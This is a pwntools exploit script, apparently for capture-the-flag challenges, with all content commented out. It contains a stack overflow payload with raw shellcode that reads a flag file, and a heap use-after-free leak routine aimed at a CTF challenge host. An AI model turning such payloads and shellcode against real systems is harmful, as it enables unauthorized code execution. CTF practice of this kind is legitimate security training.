from pwn import *

context.terminal=['tmux','splitw','-h']
context.arch="amd64"
# # context.arch="i386"
# context.log_level='debug'

s = lambda data:p.send(data)
sa = lambda content,data:p.sendafter(content,data)
sl = lambda data:p.sendline(data)
sla = lambda content,data:p.sendlineafter(content,data)
ru = lambda content:p.recvuntil(content)
rl = lambda :p.recvline()
ls = lambda name,var:log.success(name+' => {}'.format(hex(var)))























# t=Timeout(3)
# flag=0
# shellcode=b'H1\xc0H1\xffH1\xf6H1\xd2H\xc7\xc0\x02\x00\x00\x00H\xbf./flag\x00\x00WH\x89\xe7\x0f\x05H\xc7\xc2\x00\x01\x00\x00H\x89\xfeH\x89\xc7H\xc7\xc0\x00\x00\x00\x00\x0f\x05H\xc7\xc7\x01\x00\x00\x00H\xc7\xc0\x01\x00\x00\x00\x0f\x05'

# p=process('./RANDOM')
# for i in range(100):
#     with t.countdown():
#         p.recvuntil('num:\n',timeout=5)
#         if(t.timeout==0):
#             flag=1
#     if flag:
#         break
#     p.sendline(str(1))
# payload=b'a'*0x28+p64(0x40094E)+b'H\xc7\xc2\xe0\x06@\x00\xff\xe2'+b'\x00'*7
# attach(p)
# p.sendlineafter('door\n',payload)
# time.sleep(2)
# p.sendline(b'a'*0x2f+p64(0x40094E)+shellcode)
# p.interactive()












# p=remote('cha.hackpack.club',41705)
# p=process('./chal')

# def create(id,name,num):
#     sla('Choose option: ',str(1))
#     sla('number (0-9): ',str(id))
#     sla('name: ',name)
#     sla('number: ',str(num))

# def delete(id):
#     sla('Choose option: ',str(2))
#     sla('delete (0-9): ',str(id))

# def edit(id,num):
#     sla('Choose option: ',str(3))
#     sla('edit (0-9): ',str(id))
#     sla('number: ',str(num))

# def showchunk(id):
#     sla('Choose option: ',str(4))
#     sla('print (0-9): ',str(id))

# def show():
#     sla('Choose option: ',str(5))

# create(0,b'a'*0x16,1)
# create(1,'b',1)
# delete(0)
# delete(1)
# showchunk(1)
# addr=u64(p.recv(6).ljsut(8,b'\x00'))
# ls('addr',addr)
# attach(p)

# p.interactive()